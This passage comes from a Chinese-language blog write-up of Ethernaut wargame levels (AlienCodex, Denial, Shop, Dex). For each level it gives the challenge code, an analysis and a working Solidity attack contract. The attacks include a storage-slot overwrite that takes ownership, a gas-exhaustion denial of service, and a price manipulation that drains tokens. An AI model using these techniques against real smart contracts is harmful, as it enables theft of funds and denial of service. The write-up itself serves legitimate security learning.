+<h3 id="Analysis-6"><a href="#Analysis-6" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目要求获取所有权，那么我们要先找到题目合约所继承的 Ownable-05.sol 合约，看看是什么。</p>
+<p>去 Ethernaut 的 Github 仓库获取代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Ownable &#123;</span><br><span class="line">    address private _owner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">    constructor () internal &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function owner() public view returns (address) &#123;</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(isOwner(), &quot;Ownable: caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isOwner() public view returns (bool) &#123;</span><br><span class="line">        return msg.sender == _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function renounceOwnership() public onlyOwner &#123;</span><br><span class="line">        emit OwnershipTransferred(_owner, address(0));</span><br><span class="line">        _owner = address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">        _transferOwnership(newOwner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transferOwnership(address newOwner) internal &#123;</span><br><span class="line">        require(newOwner != address(0), &quot;Ownable: new owner is the zero address&quot;);</span><br><span class="line">        emit OwnershipTransferred(_owner, newOwner);</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>那么对于成为 owner 这件事情，我们就有头绪了，关键就是要篡改这里面的 _owner 成员变量。</p>
+<p>这里需要搞清楚动态数组在 EVM 中的存储机制，首先按照存储布局规则确定一个存放该动态数组的插槽 p，这个插槽中存放的是动态数组的元素数量。而元素的值从插槽 keccak256(p) 开始存储，而 EVM 的存储只有 2^256^ 个插槽，当插槽下标大于 2^256^-1 时就会溢出到 0。由于 EVM 并不会验证数组的 ABI 编码中的长度与实际有效负载长度是否匹配，我们可以在 codex.length 为 0 的时候调用 retract() 导致数组长度下溢出，从而变成 32 字节所能存储的最大的无符号整数：2^256^-1。</p>
+<p>以上是我们能对动态数组 codex 进行的操作，接下来回到实际的存储中，看看最终导致的结果：</p>
+<p>按照存储布局规则，存储的顺序是 父合约的 _owner (20 Bytes)、本合约的 contact (1 Btye)、本合约的 codex (32 Bytes，实际存的是 codex.length)。那么 codex 的长度就会存在 slot1 中（即上文的 p 为 1），而 codex 的元素则会从下标为 keccak(1) 的插槽开始存储，而 codex 一个元素占 32 字节，所以一个插槽刚好存储一个元素。</p>
+<p>回到刚才让 codex 下溢出的情况，codex.length 为 2^256^-1，而 keccak(1) 是一个极大的整数，所以必然会导致插槽下标溢出，导致所有的插槽都能被 codex 的长度值和元素所控制。我们看看这个情况下存储的情况：</p>
+<table>
+<thead>
+<tr>
+<th>插槽下标</th>
+<th>存储内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>_owner 和 contact</td>
+</tr>
+<tr>
+<td>1</td>
+<td>codex.length</td>
+</tr>
+<tr>
+<td>……</td>
+<td>……</td>
+</tr>
+<tr>
+<td>keccak(1)</td>
+<td>codex[0]</td>
+</tr>
+<tr>
+<td>……</td>
+<td>……</td>
+</tr>
+<tr>
+<td>2^256^-1</td>
+<td>codex[2^256^-1-keccak(1)]</td>
+</tr>
+</tbody></table>
+<p>很明显，如果插槽下标溢出，则 codex[2^256^-1-keccak(1)+1] 会被储存在 slot0 中，也就是可以控制 _owner 状态变量了。</p>
+<h3 id="Exploit-5"><a href="#Exploit-5" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    AlienCodex public codex;</span><br><span class="line">    bytes32 public payload;</span><br><span class="line">    uint public i;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        codex = AlienCodex(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        i = 2 ** 256 - 1 - uint(keccak256(abi.encode(1))) + 1;</span><br><span class="line">        payload = bytes32(uint256(uint160(tx.origin)));</span><br><span class="line">        codex.makeContact();</span><br><span class="line">        codex.retract();</span><br><span class="line">        codex.revise(i, payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402062044128.png"
+                      alt="image-20240206204425033"
+                ></p>
+<h2 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20 Denial"></a>20 Denial</h2><h3 id="Code-7"><a href="#Code-7" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address public constant owner = address(0xA9E);</span><br><span class="line">    uint256 timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint256 amountToSend = address(this).balance / 100;</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);</span><br><span class="line">        payable(owner).transfer(amountToSend);</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = block.timestamp;</span><br><span class="line">        withdrawPartnerBalances[partner] += amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h3><p>This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.</p>
+<p>If you can deny the owner from withdrawing funds when they call <code>withdraw()</code> (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.</p>
+<h3 id="Analysis-7"><a href="#Analysis-7" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目要求不能让 owner 拿到钱。</p>
+<p>这里我第一反应是把 partner 的交易 revert 掉，但是 call 并不会检查返回值，所以即使 revert 也不会影响到给 owner 的转账。那么我们就需要在 partner 合约的 fallback 函数下文章，在这里把 gas 耗尽就可以达到目的了。</p>
+<h3 id="Exploit-6"><a href="#Exploit-6" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Denial &#123;</span><br><span class="line">    function contractBalance() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function owner() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function partner() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) external;</span><br><span class="line"></span><br><span class="line">    function withdraw() external;</span><br><span class="line"></span><br><span class="line">    receive() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    Denial public myD;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _target) public &#123;</span><br><span class="line">        myD = Denial(_target);</span><br><span class="line">        myD.setWithdrawPartner(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        while(true) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在靶场上提交容器的时候，后台会调用 withdraw 方法并验证：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function validateInstance(address payable _instance, address _player) public override returns (bool) &#123;</span><br><span class="line">    _player;</span><br><span class="line">    Denial instance = Denial(_instance);</span><br><span class="line">    if (address(instance).balance &lt;= 100 wei) &#123;</span><br><span class="line">        // cheating otherwise</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    // fix the gas limit for this call</span><br><span class="line">    (bool result, ) = address(instance).call&#123;gas: 1000000&#125;(abi.encodeWithSignature(&quot;withdraw()&quot;)); // Must revert</span><br><span class="line">    return !result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402071620819.png"
+                      alt="image-20240207162032733"
+                ></p>
+<h2 id="21-Shop"><a href="#21-Shop" class="headerlink" title="21 Shop"></a>21 Shop</h2><h3 id="Code-8"><a href="#Code-8" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">    uint256 public price = 100;</span><br><span class="line">    bool public isSold;</span><br><span class="line"></span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">            isSold = true;</span><br><span class="line">            price = _buyer.price();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h3><p>Сan you get the item from the shop for less than the price asked?</p>
+<p><strong>Things that might help:</strong></p>
+<ul>
+<li><code>Shop</code> expects to be used from a <code>Buyer</code></li>
+<li>Understanding restrictions of view functions</li>
+</ul>
+<h3 id="Analysis-8"><a href="#Analysis-8" class="headerlink" title="Analysis"></a>Analysis</h3><p>注意不要被套入题目要求的思维定式，我们不需要以较小的 price 来绕过，而是 return 不同的 price 值。</p>
+<p>看看题目后台的验证代码就知道了：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function validateInstance(address payable _instance, address) public view override returns (bool) &#123;</span><br><span class="line">    Shop _shop = Shop(_instance);</span><br><span class="line">    return _shop.price() &lt; 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>我们可以使题目后台合约和题目合约调用 price 时获取到不同的返回值，从而满足题目的要求。</p>
+<h3 id="Exploit-7"><a href="#Exploit-7" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Shop &#123;</span><br><span class="line">    function buy() external;</span><br><span class="line"></span><br><span class="line">    function isSold() external view returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Buyer &#123;</span><br><span class="line">    Shop public shop;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        shop = Shop(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() external view returns (uint256) &#123;</span><br><span class="line">        if (shop.isSold() == false) &#123;</span><br><span class="line">            return 100;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 99;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        shop.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402071734294.png"
+                      alt="image-20240207173423215"
+                ></p>
+<h2 id="22-Dex"><a href="#22-Dex" class="headerlink" title="22 Dex"></a>22 Dex</h2><h3 id="Code-9"><a href="#Code-9" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">    address public token1;</span><br><span class="line">    address public token2;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">        token2 = _token2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addLiquidity(address token_address, uint256 amount)</span><br><span class="line">        public</span><br><span class="line">        onlyOwner</span><br><span class="line">    &#123;</span><br><span class="line">        IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public &#123;</span><br><span class="line">        require(</span><br><span class="line">            (from == token1 &amp;&amp; to == token2) ||</span><br><span class="line">                (from == token2 &amp;&amp; to == token1),</span><br><span class="line">            &quot;Invalid tokens&quot;</span><br><span class="line">        );</span><br><span class="line">        require(</span><br><span class="line">            IERC20(from).balanceOf(msg.sender) &gt;= amount,</span><br><span class="line">            &quot;Not enough to swap&quot;</span><br><span class="line">        );</span><br><span class="line">        uint256 swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">        IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSwapPrice(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public view returns (uint256) &#123;</span><br><span class="line">        return ((amount * IERC20(to).balanceOf(address(this))) /</span><br><span class="line">            IERC20(from).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public &#123;</span><br><span class="line">        SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">        SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address token, address account)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        returns (uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        return IERC20(token).balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">    address private _dex;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address dexInstance,</span><br><span class="line">        string memory name,</span><br><span class="line">        string memory symbol,</span><br><span class="line">        uint256 initialSupply</span><br><span class="line">    ) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public &#123;</span><br><span class="line">        require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">        super._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h3><p>The goal of this level is for you to hack the basic <a class="link"   href="https://en.wikipedia.org/wiki/Decentralized_exchange" >DEX <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> contract below and steal the funds by price manipulation.</p>
+<p>You will start with 10 tokens of <code>token1</code> and 10 of <code>token2</code>. The DEX contract starts with 100 of each token.</p>
+<p>You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a “bad” price of the assets.</p>
+<p><strong>Quick note</strong></p>
+<p>Normally, when you make a swap with an ERC20 token, you have to <code>approve</code> the contract to spend your tokens for you. To keep with the syntax of the game, we’ve just added the <code>approve</code> method to the contract itself. So feel free to use <code>contract.approve(contract.address, &lt;uint amount&gt;)</code> instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the <code>SwappableToken</code> contract otherwise.</p>
+<p> Things that might help:</p>
+<ul>
+<li>How is the price of the token calculated?</li>
+<li>How does the <code>swap</code> method work?</li>
+<li>How do you <code>approve</code> a transaction of an ERC20?</li>
+<li>Theres more than one way to interact with a contract!</li>
+<li>Remix might help</li>
+<li>What does “At Address” do?</li>
+</ul>
+<h3 id="Analysis-9"><a href="#Analysis-9" class="headerlink" title="Analysis"></a>Analysis</h3><p>关卡要求掏空交易所里两种代币的其中的至少一种，看到汇率的计算方式，决定从这里入手：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) &#123;</span><br><span class="line">    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>该函数的大概意思是将交易所拥有的两种代币的比值当作汇率，问题就出在这里。使用余额作为计算价格的因素，会导致价格可控，被恶意利用。</p>
+<p>假设一下，我们把手上的 token2 都换成 token1，这时我们有 20 个 token1，交易所有 90 个 token1，110 个 token2。那么我们把这 20 个 token1 又换成token2，重复几遍，就会发生奇妙的事情：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">swapAmount = 20 * 110 / 90 = 24.44444 ≈ 24</span><br><span class="line">           = 24 * 110 / 86 = 30.69767 ≈ 30</span><br><span class="line">           = 30 * 110 / 80 = 41.25000 ≈ 41</span><br></pre></td></tr></table></figure></div>
+
+<p>那么继续下去就能掏空一种代币了。</p>
+<h3 id="Exploit-8"><a href="#Exploit-8" class="headerlink" title="Exploit"></a>Exploit</h3><p>有点像滚烫开水的降温法术（就是用两个杯子来回倒</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403070106661.png"
+                      alt="image-20240307010605583"
+                ></p>
+<p>成功掏空了 token1</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403070112218.png"
+                      alt="image-20240307011212159"
+                ></p>
 ]]></content>
       <categories>
         <category>靶场</category>
